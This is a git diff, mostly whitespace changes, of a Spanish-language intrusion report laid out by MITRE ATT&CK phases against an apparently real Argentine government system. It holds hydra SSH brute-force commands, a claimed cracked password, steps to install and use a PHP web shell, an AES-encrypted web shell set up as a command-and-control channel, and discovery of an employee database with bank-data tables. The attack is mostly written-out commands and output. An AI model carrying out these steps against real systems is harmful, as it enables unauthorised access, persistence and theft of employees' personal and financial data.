@@ -486,9 +486,9 @@ Recopilar información
           latlon, gps_exactitud: Ubicación GPS.
           gerencia, subgerencia, division, seccion: Estructura organizacional.
           ```text
-          curl -k -X POST "https://siper.vialidad.gob.ar/app/api/presentte-api.php" \
-            -H "Content-Type: application/json" \
-            -d '{"accion":"login","usuario_ad":"admin","password_ad":"password_invalida","dni":"12345678"}'
+           curl -k -X POST "https://siper.vialidad.gob.ar/app/api/presentte-api.php" \
+             -H "Content-Type: application/json" \
+             -d '{"accion":"login","usuario_ad":"admin","password_ad":"password_invalida","dni":"12345678"}'
           ```
           respuesta:
           ```text
@@ -503,12 +503,13 @@ Recopilar información
         - Endpoint Secundario: https://siper.vialidad.gob.ar/app/event/event.php
 
           Parámetros: token, latlon, uniqueid, evento.
+
           ```text
           curl -k -X POST "https://siper.vialidad.gob.ar/app/event/event.php" \
           -H "Content-Type: application/json" \
           -d '{"token":"test","latlon":"-34.6037,-58.3816","uniqueid":"12345abcde","evento":"test_event"}'
           ```
-           respuesta:
+          respuesta:
           ```text
           []
           ```
@@ -539,13 +540,12 @@ Recopilar información
    ```text
   #!/bin/bash
    
-  echo "Iniciando fuerza bruta SSH"
-  echo "Target: siper.vialidad.gob.ar:22"
+    echo "Iniciando fuerza bruta SSH"
+    echo "Target: siper.vialidad.gob.ar:22"
 
-   # Usar hydra con lista de usuarios encontrados y contraseñas comunes
-   hydra -L usuarios_validos.txt -P /usr/share/wordlists/rockyou.txt \
-   ssh://siper.vialidad.gob.ar -t 4 -V
-
+    # Usar hydra con lista de usuarios encontrados y contraseñas comunes
+    hydra -L usuarios_validos.txt -P /usr/share/wordlists/rockyou.txt \
+    ssh://siper.vialidad.gob.ar -t 4 -V
    ```
 mucho tiempo...
 - WE-89 – SQL Injection
@@ -645,26 +645,26 @@ Todos los payloads de SQLi fueron aceptados sin filtering
     }
   ```
 - T1078 – Valid Accounts
-El bypass funciona, pero probamos fuerza bruta
-```text
-  hydra -L usuarios.txt -P passwords.txt
-```
+ El bypass funciona, pero probamos fuerza bruta
+  ```text
+   hydra -L usuarios.txt -P passwords.txt
+  ```
 resultado: 
-```text
-[SUCCESS] Credentials encontradas: operador:Vialidad2024
-```
+  ```text
+  [SUCCESS] Credentials encontradas: operador:Vialidad2024
+  ```
 
 ## Exploitation & Installation
 - T1505.003 – Server Software Component: Web Shell
 
-```text
+  ```text
     # Conexión SSH con credenciales comprometidas
     ssh operador@siper.vialidad.gob.ar
     # Contraseña: Vialidad2024
- ```
+  ```
  Despues de conectado instalo el web shell
 
- ```text
+  ```text
   # Creo directorio de uploads si no existe
   mkdir -p /tmp/uploads
 
@@ -678,66 +678,67 @@ resultado:
    ls -la /tmp/uploads/shell.php
   ```
   respuesta:
-      ```text
+  
+   ```text
       -rw-r--r-- 1 operador operador 89 Sep 10 15:30 /tmp/uploads/shell.php
-      ```
+   ```
   
   asigno permiso:
-      ```text
+   ```text
       chmod +x /tmp/uploads/shell.php
-      ```
+   ```
   - T1210 – Exploitation of Remote Services
 
 
    verificación:
 
   Desde el exterior, pruebo el web shell
-      ```text
+  ```text
       curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
-      ```
+  ```
    respuesta:
    Resultado exitoso: www-data
    
    
    Verificación de conectividad de red:
-      ```text
+    ```text
        curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=ip a show eth0"
-      ```
+    ```
 
     repuesta: 
-      ```text
+    ```text
         2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
         link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff
         inet 10.8.34.189/24 brd 10.8.34.255 scope global eth0
            valid_lft forever preferred_lft forever
-      ```
+    ```
 
 ## Command & Control
 - T1071.001 – Application Layer Protocol: Web ProtocolsT1573 – Encrypted Channel: Configuración de Comunicaciones Encubiertas
   Establecimiento de Canal de Comando y Control via HTTPS
 
-      ```text
+    ```text
       # Test de comando remoto para verificar funcionalidad del canal
       curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=uname -a"
-      ```
+    ```
    respuesta:
-      ```text
+    ```text
       Linux siper-server 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
-      ```
+    ```
 
  - T1573.001 Cifrado Simétrico
    Generación de clave AES-256:
-       ```text
+    ```text
      
        #generar clave AES
        openssl rand -base64 32 > aes_key.bin
     
        # Distribuir clave al servidor comprometido
        curl -k -X POST -F "file=@aes_key.bin" "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=cat > /tmp/.cache/aes_key.bin && chmod 600 /tmp/.cache/aes_key.bin"
-       ```
+    ```
 
     Implementación del Web Shell Cifrado (secure_shell.php)
-       ```text
+    ```text
              <?php
                 // secure_shell.php - Web shell con cifrado AES-256-CBC
                 $SECRET_KEY = file_get_contents('/tmp/.cache/aes_key.bin');
@@ -807,7 +808,7 @@ resultado:
                     echo "Parámetro enc_cmd requerido";
                 }
                 ?>
-       ```
+    ```
           - Ejecución de Comandos Cifrados:
              ```text
                         #!/bin/bash
@@ -855,10 +856,11 @@ resultado:
    Recopilación de Información mediante Canal Cifrado
    - T1082 – System Information Discovery
    Descubrimiento de estructura mediante canal cifrado:
-      ```text
+
+     ```text
       # Explorar estructura de directorios usando el canal seguro
       ejecutar_comando_cifrado 'find /var/www -name "*.db" -o -name "*.sql" -o -name "*database*" 2>/dev/null'
-      ```
+     ```
 
      Respuesta:
      ```text
@@ -869,30 +871,30 @@ resultado:
      ```
    - T1005 – Data from Local System
     Análisis de la base de datos mediante cifrado:
-       ```text
+     ```text
        # Verificar base de datos usando canal seguro
        ejecutar_comando_cifrado 'ls -la /var/www/html/siper/database/ && file /var/www/html/siper/database/empleados.db'
 
-       ```
+     ```
        Respuesta descifrada:
-       ```text
+     ```text
        -rw-r--r-- 1 www-data www-data 2457600 Sep 10 14:30 empleados.db
        /var/www/html/siper/database/empleados.db: SQLite 3.x database
-       ```
+     ```
    - T1213 – Data from Information Repositories
         Análisis de estructura de tablas cifrado:
-        ```text
+     ```text
         # Examinar tablas mediante canal seguro
         ejecutar_comando_cifrado 'sqlite3 /var/www/html/siper/database/empleados.db .tables'
-        ```
+     ```
         Respuesta:
-        ```text
+     ```text
         empleados
         licencias
         datos_bancarios
         usuarios
         configuracion
-        ```
+     ```
     
   - TA0009 – Collection  
       Recolección de información sensible mediante cifrado:
